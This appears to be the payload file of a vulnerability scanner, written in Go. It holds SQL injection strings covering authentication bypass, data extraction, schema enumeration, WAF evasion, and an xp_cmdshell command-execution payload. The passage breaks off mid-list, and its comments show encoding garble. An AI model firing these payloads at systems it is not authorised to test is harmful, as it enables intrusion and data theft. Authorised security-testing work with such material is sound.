package payloads

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// SQL Injection Payloads â€” Sourced from PayloadsAllTheThings/SQL Injection
// Covers: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, Cassandra, DB2
// Techniques: Entry Point Detection, Error-Based, Boolean Blind, Time Blind,
//             UNION-Based, Stacked Queries, Auth Bypass, WAF Bypass, Polyglot
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func SQLiPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatSQLi,
		Description: "SQL Injection â€” PayloadsAllTheThings + OWASP A03:2021",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
		Payloads: sqliEntryPoint(),
	}
}

func sqliEntryPoint() []Payload {
	var all []Payload
	all = append(all, sqliEntryPointDetection()...)
	all = append(all, sqliDBMSFingerprint()...)
	all = append(all, sqliAuthBypass()...)
	all = append(all, sqliErrorBased()...)
	all = append(all, sqliBooleanBlind()...)
	all = append(all, sqliTimeBlind()...)
	all = append(all, sqliUnionBased()...)
	all = append(all, sqliStackedQueries()...)
	all = append(all, sqliWAFBypass()...)
	all = append(all, sqliPolyglot()...)
	all = append(all, sqliOOBExfil()...)
	return all
}

// â”€â”€â”€â”€ Entry Point Detection (from PayloadsAllTheThings README.md) â”€â”€â”€â”€
func sqliEntryPointDetection() []Payload {
	return []Payload{
		p("sqli-ep-single-quote", CatSQLi, TechProbe, "Single Quote", `'`,
			"Basic single-quote to trigger SQL syntax error",
			safe, DetectErrorPattern, `(?i)(sql.syntax|unterminated|quoted string|ORA-|pg_query|sqlite)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point"}),
		p("sqli-ep-double-quote", CatSQLi, TechProbe, "Double Quote", `"`,
			"Double-quote entry point detection",
			safe, DetectErrorPattern, `(?i)(sql.syntax|unterminated|quoted string|ORA-|pg_query)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point"}),
		p("sqli-ep-semicolon", CatSQLi, TechProbe, "Semicolon", `;`,
			"Semicolon to detect stacked query support",
			safe, DetectErrorPattern, `(?i)(sql.syntax|unterminated|error)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point"}),
		p("sqli-ep-close-paren", CatSQLi, TechProbe, "Close Parenthesis", `)`,
			"Unmatched close paren â€” detects sub-query injection points",
			safe, DetectErrorPattern, `(?i)(syntax error|unexpected|near "\)")`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point"}),
		p("sqli-ep-asterisk", CatSQLi, TechProbe, "Asterisk Wildcard", `*`,
			"Asterisk wildcard to detect raw SQL concatenation",
			safe, DetectErrorPattern, `(?i)(sql.syntax|error)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point"}),
		p("sqli-ep-backslash", CatSQLi, TechProbe, "Backslash Escape", `\`,
			"Backslash to test escape handling in MySQL",
			safe, DetectErrorPattern, `(?i)(sql.syntax|escape|unterminated)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point"}),
		// Encoded variants (PayloadsAllTheThings: %27, %22, %23, %3B, %29, %2A)
		p("sqli-ep-encoded-quote", CatSQLi, TechProbe, "URL-Encoded Single Quote", `%27`,
			"URL-encoded single quote â€” bypasses basic input filters",
			safe, DetectErrorPattern, `(?i)(sql.syntax|unterminated|quoted)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point", "encoded"}),
		p("sqli-ep-double-encoded", CatSQLi, TechProbe, "Double-Encoded Quote", `%2527`,
			"Double URL-encoded quote â€” bypasses single-pass decoding",
			safe, DetectErrorPattern, `(?i)(sql.syntax|unterminated|quoted)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point", "encoded"}),
		// Unicode modifier letters (PayloadsAllTheThings)
		p("sqli-ep-unicode-prime", CatSQLi, TechProbe, "Unicode Modifier Prime", "\u02B9",
			"Unicode MODIFIER LETTER PRIME (U+02B9) â†’ apostrophe transform",
			safe, DetectErrorPattern, `(?i)(sql.syntax|unterminated)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point", "unicode"}),
		p("sqli-ep-unicode-double-prime", CatSQLi, TechProbe, "Unicode Double Prime", "\u02BA",
			"Unicode MODIFIER LETTER DOUBLE PRIME (U+02BA) â†’ double-quote transform",
			safe, DetectErrorPattern, `(?i)(sql.syntax|unterminated)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point", "unicode"}),
		// Integer overflow
		p("sqli-ep-int-overflow", CatSQLi, TechProbe, "Integer Overflow", `999999999999999999999`,
			"Large integer â€” triggers numeric overflow error revealing DB type",
			safe, DetectErrorPattern, `(?i)(out of range|overflow|bigint|numeric)`,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point"}),
		// Merging characters (PayloadsAllTheThings)
		p("sqli-ep-concat-pipe", CatSQLi, TechProbe, "Concat Pipe Merge", `'||'VYOMITE`,
			"Pipe concatenation merge â€” string context detection",
			safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, nil, []string{"entry_point", "merge"}),
		p("sqli-ep-concat-plus", CatSQLi, TechProbe, "Concat Plus Merge", `'+'VYOMITE`,
			"Plus concatenation merge â€” MSSQL string context",
			safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, []string{"MSSQL"}, []string{"entry_point", "merge"}),
		p("sqli-ep-concat-space", CatSQLi, TechProbe, "Concat Space Merge", `' 'VYOMITE`,
			"Space concatenation merge â€” MySQL string context",
			safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"entry_point", "merge"}),
	}
}

// â”€â”€â”€â”€ DBMS Identification (PayloadsAllTheThings keyword-based + error-based) â”€â”€â”€â”€
func sqliDBMSFingerprint() []Payload {
	return []Payload{
		p("sqli-fp-mysql-conv", CatSQLi, TechDBMSFingerprint, "MySQL conv() Fingerprint", `' AND conv('a',16,2)=conv('a',16,2)-- -`,
			"MySQL-specific conv() function â€” true = MySQL",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"fingerprint"}),
		p("sqli-fp-mysql-connid", CatSQLi, TechDBMSFingerprint, "MySQL connection_id()", `' AND connection_id()=connection_id()-- -`,
			"MySQL connection_id() always-true â€” confirms MySQL",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"fingerprint"}),
		p("sqli-fp-mysql-crc32", CatSQLi, TechDBMSFingerprint, "MySQL crc32()", `' AND crc32('MySQL')=crc32('MySQL')-- -`,
			"MySQL crc32() identity â€” confirms MySQL engine",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"fingerprint"}),
		p("sqli-fp-mssql-checksum", CatSQLi, TechDBMSFingerprint, "MSSQL BINARY_CHECKSUM", `' AND BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)-- -`,
			"MSSQL BINARY_CHECKSUM identity â€” confirms MSSQL",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MSSQL"}, []string{"fingerprint"}),
		p("sqli-fp-mssql-connections", CatSQLi, TechDBMSFingerprint, "MSSQL @@CONNECTIONS", `' AND @@CONNECTIONS=@@CONNECTIONS-- -`,
			"MSSQL @@CONNECTIONS global variable â€” confirms MSSQL",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MSSQL"}, []string{"fingerprint"}),
		p("sqli-fp-oracle-rownum", CatSQLi, TechDBMSFingerprint, "Oracle ROWNUM", `' AND ROWNUM=ROWNUM-- -`,
			"Oracle ROWNUM pseudo-column â€” confirms Oracle",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"Oracle"}, []string{"fingerprint"}),
		p("sqli-fp-oracle-rawtohex", CatSQLi, TechDBMSFingerprint, "Oracle RAWTOHEX", `' AND RAWTOHEX('AB')=RAWTOHEX('AB')-- -`,
			"Oracle RAWTOHEX identity â€” confirms Oracle",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"Oracle"}, []string{"fingerprint"}),
		p("sqli-fp-pgsql-cast", CatSQLi, TechDBMSFingerprint, "PostgreSQL Cast", `' AND 5::int=5-- -`,
			"PostgreSQL :: cast operator â€” confirms PostgreSQL",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"PostgreSQL"}, []string{"fingerprint"}),
		p("sqli-fp-pgsql-encoding", CatSQLi, TechDBMSFingerprint, "PostgreSQL client_encoding", `' AND pg_client_encoding()=pg_client_encoding()-- -`,
			"PostgreSQL pg_client_encoding() â€” confirms PostgreSQL",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"PostgreSQL"}, []string{"fingerprint"}),
		p("sqli-fp-sqlite-version", CatSQLi, TechDBMSFingerprint, "SQLite sqlite_version()", `' AND sqlite_version()=sqlite_version()-- -`,
			"SQLite sqlite_version() identity â€” confirms SQLite",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"SQLite"}, []string{"fingerprint"}),
	}
}

// â”€â”€â”€â”€ Authentication Bypass (PayloadsAllTheThings Auth_Bypass.txt) â”€â”€â”€â”€
func sqliAuthBypass() []Payload {
	bypasses := []struct{ id, name, value, desc string }{
		{"sqli-auth-or-1eq1", "OR 1=1 Comment", `' OR 1=1-- -`, "Always-true OR with comment â€” classic auth bypass"},
		{"sqli-auth-or-1eq1-limit", "OR 1=1 LIMIT", `' OR 1=1 LIMIT 1-- -`, "First-row limit â€” returns single user"},
		{"sqli-auth-or-eq", "OR ''='", `' OR ''='`, "Empty string equality â€” always true without comment"},
		{"sqli-auth-or-like", "OR LIKE", `' OR 'x'='x`, "LIKE-style always-true bypass"},
		{"sqli-auth-admin-dash-dash", "admin'--", `admin'-- -`, "Username admin with comment â€” skips password check"},
		{"sqli-auth-admin-hash", "admin'#", `admin'#`, "Username admin with MySQL hash comment"},
		{"sqli-auth-union-select", "UNION SELECT Auth", `' UNION SELECT 1,'admin','password'-- -`, "UNION-based auth bypass â€” injects fake admin row"},
		{"sqli-auth-double-or", "Double OR", `" OR ""="`, "Double-quote context always-true"},
		{"sqli-auth-or-true", "OR true Keyword", `' OR true-- -`, "Boolean true keyword bypass (MySQL/PostgreSQL)"},
		{"sqli-auth-or-1-group", "OR 1 GROUP", `' OR 1 GROUP BY 1-- -`, "GROUP BY to force single-row in authentication"},
		{"sqli-auth-having", "HAVING Bypass", `' HAVING 1=1-- -`, "HAVING clause bypass â€” sometimes exposes column names"},
		{"sqli-auth-order-by-sleep", "Auth + ORDER BY", `' OR 1=1 ORDER BY 1-- -`, "ORDER BY to sort and return first user"},
		{"sqli-auth-null-pw", "NULL Password", `' UNION SELECT NULL,NULL,NULL-- -`, "NULL password column injection"},
	}

	var payloads []Payload
	for _, b := range bypasses {
		payloads = append(payloads,
			p(b.id, CatSQLi, TechAuthBypass, b.name, b.value, b.desc,
				safe, DetectContentDiff, ``,
				"CWE-89", "A03:2021", 0, nil, []string{"auth_bypass"}))
	}
	return payloads
}

// â”€â”€â”€â”€ Error-Based (MySQL, PostgreSQL, MSSQL, Oracle â€” from PayloadsAllTheThings) â”€â”€â”€â”€
func sqliErrorBased() []Payload {
	return []Payload{
		// MySQL ExtractValue & UpdateXML
		p("sqli-err-mysql-extractvalue", CatSQLi, TechErrorBased, "MySQL ExtractValue",
			`' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -`,
			"MySQL XPATH-based error extraction â€” version fingerprint",
			safe, DetectErrorPattern, `(?i)(XPATH syntax|extractvalue|~[0-9.]+~)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"error_based"}),
		p("sqli-err-mysql-updatexml", CatSQLi, TechErrorBased, "MySQL UpdateXML",
			`' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -`,
			"MySQL UPDATEXML error extraction â€” user identification",
			safe, DetectErrorPattern, `(?i)(XPATH syntax|updatexml|~\w+@)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"error_based"}),
		p("sqli-err-mysql-floor", CatSQLi, TechErrorBased, "MySQL FLOOR(RAND())",
			`' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
			"MySQL FLOOR/RAND duplicate key error â€” classic error-based extraction",
			safe, DetectErrorPattern, `(?i)(Duplicate entry|for key|group_key)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"error_based"}),
		p("sqli-err-mysql-name-const", CatSQLi, TechErrorBased, "MySQL NAME_CONST",
			`' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -`,
			"MySQL NAME_CONST duplicate column error extraction",
			safe, DetectErrorPattern, `(?i)(Duplicate column|NAME_CONST)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"error_based"}),
		p("sqli-err-mysql-exp-overflow", CatSQLi, TechErrorBased, "MySQL EXP Overflow",
			`' AND EXP(~(SELECT * FROM (SELECT version())x))-- -`,
			"MySQL EXP() DOUBLE overflow â€” MySQL >= 5.5.5",
			safe, DetectErrorPattern, `(?i)(DOUBLE value is out of range|exp)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"error_based"}),
		// PostgreSQL
		p("sqli-err-pgsql-cast", CatSQLi, TechErrorBased, "PostgreSQL CAST Error",
			`' AND 1=CAST((SELECT version()) AS int)-- -`,
			"PostgreSQL CAST type-coercion error â€” leaks version string",
			safe, DetectErrorPattern, `(?i)(invalid input syntax|integer|PostgreSQL)`,
			"CWE-89", "A03:2021", 0, []string{"PostgreSQL"}, []string{"error_based"}),
		p("sqli-err-pgsql-convert", CatSQLi, TechErrorBased, "PostgreSQL :: CAST",
			`' AND 1=(version()::int)-- -`,
			"PostgreSQL :: cast operator type error extraction",
			safe, DetectErrorPattern, `(?i)(invalid input syntax|integer)`,
			"CWE-89", "A03:2021", 0, []string{"PostgreSQL"}, []string{"error_based"}),
		// MSSQL
		p("sqli-err-mssql-convert", CatSQLi, TechErrorBased, "MSSQL CONVERT Error",
			`' AND 1=CONVERT(int,(SELECT @@version))-- -`,
			"MSSQL CONVERT type-coercion error â€” leaks server version",
			safe, DetectErrorPattern, `(?i)(conversion failed|nvarchar|Microsoft SQL Server)`,
			"CWE-89", "A03:2021", 0, []string{"MSSQL"}, []string{"error_based"}),
		p("sqli-err-mssql-concat-cast", CatSQLi, TechErrorBased, "MSSQL CONCAT CAST",
			`' AND 1=CONCAT(0x7e,CAST(@@version AS nvarchar(100)))-- -`,
			"MSSQL CONCAT+CAST error extraction",
			safe, DetectErrorPattern, `(?i)(conversion failed|nvarchar|Microsoft)`,
			"CWE-89", "A03:2021", 0, []string{"MSSQL"}, []string{"error_based"}),
		// Oracle
		p("sqli-err-oracle-utl-inaddr", CatSQLi, TechErrorBased, "Oracle UTL_INADDR",
			`' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -`,
			"Oracle UTL_INADDR DNS resolution error extraction",
			safe, DetectErrorPattern, `(?i)(ORA-\d{5}|UTL_INADDR)`,
			"CWE-89", "A03:2021", 0, []string{"Oracle"}, []string{"error_based"}),
		p("sqli-err-oracle-ctxsys", CatSQLi, TechErrorBased, "Oracle CTXSYS.DRITHSX",
			`' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -`,
			"Oracle CTXSYS error extraction for text indexing",
			safe, DetectErrorPattern, `(?i)(ORA-\d{5}|DRG-|CTXSYS)`,
			"CWE-89", "A03:2021", 0, []string{"Oracle"}, []string{"error_based"}),
	}
}

// â”€â”€â”€â”€ Boolean Blind (from PayloadsAllTheThings) â”€â”€â”€â”€
func sqliBooleanBlind() []Payload {
	return []Payload{
		p("sqli-blind-or-true", CatSQLi, TechBooleanBlind, "OR True Baseline", `' OR 1=1-- -`,
			"Boolean true â€” compare response with false baseline", safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, nil, []string{"boolean_blind"}),
		p("sqli-blind-or-false", CatSQLi, TechBooleanBlind, "OR False Baseline", `' OR 1=2-- -`,
			"Boolean false â€” paired with true to detect blind SQLi", safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, nil, []string{"boolean_blind"}),
		p("sqli-blind-and-true", CatSQLi, TechBooleanBlind, "AND True", `' AND 1=1-- -`,
			"AND-based true for authenticated context", safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, nil, []string{"boolean_blind"}),
		p("sqli-blind-and-false", CatSQLi, TechBooleanBlind, "AND False", `' AND 1=2-- -`,
			"AND-based false baseline", safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, nil, []string{"boolean_blind"}),
		p("sqli-blind-substr-mysql", CatSQLi, TechBooleanBlind, "MySQL SUBSTR Char", `' AND SUBSTRING((SELECT database()),1,1)='a'-- -`,
			"Character-by-character extraction via MySQL SUBSTRING",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"boolean_blind", "extraction"}),
		p("sqli-blind-mysql-makeset", CatSQLi, TechBooleanBlind, "MySQL MAKE_SET Blind", `' AND MAKE_SET(1,IF(1=1,'a','b'))='a'-- -`,
			"MySQL MAKE_SET() blind extraction â€” PayloadsAllTheThings technique",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"boolean_blind"}),
		p("sqli-blind-mysql-like", CatSQLi, TechBooleanBlind, "MySQL LIKE Blind", `' AND (SELECT database()) LIKE 'a%'-- -`,
			"MySQL LIKE pattern matching for blind extraction",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"boolean_blind"}),
		p("sqli-blind-mysql-regexp", CatSQLi, TechBooleanBlind, "MySQL REGEXP Blind", `' AND (SELECT database()) REGEXP '^a'-- -`,
			"MySQL REGEXP pattern blind extraction",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"boolean_blind"}),
	}
}

// â”€â”€â”€â”€ Time-Based Blind (from PayloadsAllTheThings MySQL/MSSQL/PgSQL/Oracle/SQLite) â”€â”€â”€â”€
func sqliTimeBlind() []Payload {
	return []Payload{
		p("sqli-time-mysql-sleep", CatSQLi, TechTimeBlind, "MySQL SLEEP(5)", `' OR SLEEP(5)-- -`,
			"MySQL SLEEP-based time-delay injection", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 5000, []string{"MySQL"}, []string{"time_blind"}),
		p("sqli-time-mysql-benchmark", CatSQLi, TechTimeBlind, "MySQL BENCHMARK", `' OR BENCHMARK(10000000,SHA1('vyomite'))-- -`,
			"MySQL BENCHMARK CPU-burn â€” bypasses SLEEP blocking WAFs", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 4000, []string{"MySQL"}, []string{"time_blind", "waf_bypass"}),
		p("sqli-time-mysql-conditional", CatSQLi, TechTimeBlind, "MySQL IF+SLEEP", `' AND IF(1=1,SLEEP(5),0)-- -`,
			"Conditional SLEEP â€” only delays if expression is true", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 5000, []string{"MySQL"}, []string{"time_blind"}),
		p("sqli-time-mysql-subselect-sleep", CatSQLi, TechTimeBlind, "MySQL Subselect SLEEP", `' AND (SELECT SLEEP(5) FROM dual)-- -`,
			"MySQL SLEEP in subselect â€” PayloadsAllTheThings technique", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 5000, []string{"MySQL"}, []string{"time_blind"}),
		p("sqli-time-pgsql-sleep", CatSQLi, TechTimeBlind, "PostgreSQL pg_sleep(5)", `'; SELECT pg_sleep(5)-- -`,
			"PostgreSQL pg_sleep stacked query delay", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 5000, []string{"PostgreSQL"}, []string{"time_blind"}),
		p("sqli-time-pgsql-generate", CatSQLi, TechTimeBlind, "PostgreSQL generate_series", `' AND 1=(SELECT COUNT(*) FROM generate_series(1,10000000))-- -`,
			"PostgreSQL CPU-burn via generate_series â€” SLEEP alternative", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 4000, []string{"PostgreSQL"}, []string{"time_blind"}),
		p("sqli-time-mssql-waitfor", CatSQLi, TechTimeBlind, "MSSQL WAITFOR DELAY", `'; WAITFOR DELAY '0:0:5'-- -`,
			"MSSQL WAITFOR DELAY time-based blind", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 5000, []string{"MSSQL"}, []string{"time_blind"}),
		p("sqli-time-oracle-pipe", CatSQLi, TechTimeBlind, "Oracle DBMS_PIPE", `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('v',5)-- -`,
			"Oracle DBMS_PIPE.RECEIVE_MESSAGE delay", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 5000, []string{"Oracle"}, []string{"time_blind"}),
		p("sqli-time-oracle-lock", CatSQLi, TechTimeBlind, "Oracle DBMS_LOCK.SLEEP", `' AND 1=DBMS_LOCK.SLEEP(5)-- -`,
			"Oracle DBMS_LOCK.SLEEP direct delay (needs EXECUTE privilege)", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 5000, []string{"Oracle"}, []string{"time_blind"}),
		p("sqli-time-sqlite-randomblob", CatSQLi, TechTimeBlind, "SQLite randomblob", `' AND 1=randomblob(500000000)-- -`,
			"SQLite randomblob CPU-burn delay technique", active, DetectTimeDelta, ``,
			"CWE-89", "A03:2021", 3000, []string{"SQLite"}, []string{"time_blind"}),
	}
}

// â”€â”€â”€â”€ UNION-Based (from PayloadsAllTheThings MySQL Injection) â”€â”€â”€â”€
func sqliUnionBased() []Payload {
	return []Payload{
		p("sqli-union-null-1", CatSQLi, TechUnionBased, "UNION NULLÃ—1", `' UNION SELECT NULL-- -`,
			"Column count probe â€” 1 column", safe, DetectErrorPattern, `(?i)(number of columns|mismatch)`,
			"CWE-89", "A03:2021", 0, nil, []string{"union"}),
		p("sqli-union-null-3", CatSQLi, TechUnionBased, "UNION NULLÃ—3", `' UNION SELECT NULL,NULL,NULL-- -`,
			"Column count probe â€” 3 columns", safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, nil, []string{"union"}),
		p("sqli-union-null-5", CatSQLi, TechUnionBased, "UNION NULLÃ—5", `' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -`,
			"Column count probe â€” 5 columns", safe, DetectContentDiff, ``,
			"CWE-89", "A03:2021", 0, nil, []string{"union"}),
		p("sqli-union-order-by", CatSQLi, TechUnionBased, "ORDER BY Column Enum", `' ORDER BY 50-- -`,
			"ORDER BY high number â€” triggers error revealing column count",
			safe, DetectErrorPattern, `(?i)(Unknown column|ORDER BY|out of range)`,
			"CWE-89", "A03:2021", 0, nil, []string{"union"}),
		p("sqli-union-limit-into", CatSQLi, TechUnionBased, "LIMIT INTO Column Enum", `1' LIMIT 1,1 INTO @,@,@-- -`,
			"MySQL LIMIT INTO method â€” PayloadsAllTheThings column detection",
			safe, DetectErrorPattern, `(?i)(different number of columns|SELECT statements)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"union"}),
		p("sqli-union-version-mysql", CatSQLi, TechUnionBased, "MySQL Version Extract", `' UNION SELECT NULL,version(),NULL-- -`,
			"MySQL version extraction via UNION", safe, DetectReflection, `[0-9]+\.[0-9]+\.[0-9]+`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"union", "extraction"}),
		p("sqli-union-schema-enum", CatSQLi, TechUnionBased, "Schema Enumeration", `' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -`,
			"Database schema enumeration via information_schema",
			safe, DetectReflection, `(?i)(information_schema|mysql|performance_schema)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"union", "extraction"}),
		p("sqli-union-table-enum", CatSQLi, TechUnionBased, "Table Enumeration", `' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -`,
			"Table name enumeration from current database",
			safe, DetectReflection, `\w+`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"union", "extraction"}),
		// Extract without column names (PayloadsAllTheThings advanced technique)
		p("sqli-union-no-info-schema", CatSQLi, TechUnionBased, "Column Enum Without info_schema", `(1)AND(SELECT * FROM db.users)=(1)`,
			"Column count via subquery error â€” no information_schema needed",
			safe, DetectErrorPattern, `(?i)(Operand should contain|column)`,
			"CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"union", "waf_bypass"}),
	}
}

// â”€â”€â”€â”€ Stacked Queries â”€â”€â”€â”€
func sqliStackedQueries() []Payload {
	return []Payload{
		p("sqli-stacked-mssql-xpcmdshell", CatSQLi, TechStackedQuery, "MSSQL xp_cmdshell", `'; EXEC xp_cmdshell 'whoami'-- -`,
			"MSSQL xp_cmdshell for OS command execution via stacked query",
			active, DetectReflection, `(?i)(nt authority|[a-z]+\\[a-z]+)`,
			"CWE-89", "A03:2021", 0, []string{"MSSQL"}, []string{"stacked", "rce"}),
		p("sqli-stacked-pgsql-copy", CatSQLi, TechStackedQuery, "PostgreSQL COPY", `'; COPY (SELECT version()) TO '/tmp/vyomite_test'-- -`,
			"PostgreSQL COPY TO file â€” file write via stacked query",
			active, DetectErrorPattern, `(?i)(COPY|permission denied|could not open)`,
			"CWE-89", "A03:2021", 0, []string{"PostgreSQL"}, []string{"stacked"}),
	}
}

// â”€â”€â”€â”€ WAF Bypass (from PayloadsAllTheThings MySQL WAF Bypass) â”€â”€â”€â”€
func sqliWAFBypass() []Payload {
	return []Payload{
		p("sqli-waf-inline-comment", CatSQLi, TechWAFBypass, "MySQL Inline Comment", `'/*!50000 OR*/ 1=1-- -`,
			"MySQL versioned inline comment â€” bypasses keyword-based WAFs",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"waf_bypass"}),
		p("sqli-waf-tab-space", CatSQLi, TechWAFBypass, "Tab Whitespace", `'%09OR%091=1--%09-`,
			"TAB character instead of space â€” bypasses space filters",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, nil, []string{"waf_bypass"}),
		p("sqli-waf-double-encode", CatSQLi, TechWAFBypass, "Double URL-Encode", `%2527%2520OR%25201%253D1--%2520-`,
			"Double URL-encoding â€” bypasses single-pass WAF decoding",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, nil, []string{"waf_bypass", "encoded"}),
		p("sqli-waf-case-toggle", CatSQLi, TechWAFBypass, "Case Toggle", `' oR 1=1-- -`,
			"Mixed case keywords â€” bypasses case-sensitive rules",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, nil, []string{"waf_bypass"}),
		p("sqli-waf-no-space-parens", CatSQLi, TechWAFBypass, "No-Space Parentheses", `'OR(1=1)--`,
			"No-space bypass using parentheses â€” PayloadsAllTheThings",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, nil, []string{"waf_bypass"}),
		p("sqli-waf-no-comma-offset", CatSQLi, TechWAFBypass, "No-Comma OFFSET", `' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- -`,
			"UNION without commas â€” JOIN-based column specification",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, nil, []string{"waf_bypass"}),
		p("sqli-waf-no-equal-like", CatSQLi, TechWAFBypass, "No-Equal LIKE Bypass", `' OR 1 LIKE 1-- -`,
			"LIKE instead of = â€” bypasses equal sign filters",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, nil, []string{"waf_bypass"}),
		p("sqli-waf-no-equal-regexp", CatSQLi, TechWAFBypass, "No-Equal REGEXP Bypass", `' OR 1 REGEXP 1-- -`,
			"REGEXP instead of = â€” alternative to LIKE bypass",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, nil, []string{"waf_bypass"}),
		p("sqli-waf-scientific", CatSQLi, TechWAFBypass, "Scientific Notation", `0e1' UNION SELECT 1,2,3-- -`,
			"MySQL scientific notation bypass â€” PayloadsAllTheThings",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"waf_bypass"}),
		p("sqli-waf-gbk-wide-byte", CatSQLi, TechWAFBypass, "GBK Wide Byte", "\xbf\x27 OR 1=1-- -",
			"GBK wide-byte injection â€” escapes addslashes/magic_quotes in PHP",
			safe, DetectContentDiff, ``, "CWE-89", "A03:2021", 0, []string{"MySQL", "PHP"}, []string{"waf_bypass", "encoding"}),
		p("sqli-waf-alt-info-schema", CatSQLi, TechWAFBypass, "Alt Info Schema (mysql.innodb)", `' UNION SELECT 1,table_name,3 FROM mysql.innodb_table_stats-- -`,
			"mysql.innodb_table_stats â€” alternative to blocked information_schema",
